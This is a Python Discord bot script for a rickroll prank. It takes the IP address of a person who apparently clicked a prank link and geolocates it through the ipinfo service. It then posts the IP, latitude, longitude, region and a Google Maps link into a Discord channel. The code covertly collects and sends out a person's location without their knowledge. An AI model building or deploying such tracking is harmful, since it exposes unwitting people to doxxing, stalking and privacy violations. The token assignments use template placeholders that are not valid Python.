import discord
import time
import datetime
import os
import ipinfo
from dotenv import load_dotenv

client = None
load_dotenv()

D_TOKEN = ${{ shared.D_TOKEN }}
API_KEY = ${{ shared.API_KEY }}

class MyClient(discord.Client):
        async def on_ready(self):
            print('Logged on as', self.user)
            channeln = client.get_channel(906776389749981197)
            ip_addr = os.getenv("IP_ADDR")
            ip_addr = ip_addr.split(",")[0]
            embed = discord.Embed(title="NEW",
                                 description="New person got RIckrolled!",
                                 timestamp=datetime.datetime.utcnow())
            embed.add_field(name="Ip Addr : ", value=ip_addr)
            handler = ipinfo.getHandler(API_KEY)
            details = handler.getDetails(ip_addr.split(",")[0])
            la_response = str(details.loc).split(",")[0]
            lo_response = str(details.loc).split(",")[1]
            region = str(details.region)
            embed.add_field(name="Latitude", value=la_response)
            embed.add_field(name="Longittude", value=lo_response)
            embed.add_field(name="Region", value=region)
            map_url = f'https://www.google.com/maps/place/@{la_response},{lo_response}/'
            embed.add_field(name="Map URl", value=map_url)
            await channeln.send(embed=embed)
            time.sleep(1)
            await client.close()

intents = discord.Intents.default()
intents.message_content = True
client = MyClient(intents=intents)
client.run(str(D_TOKEN))
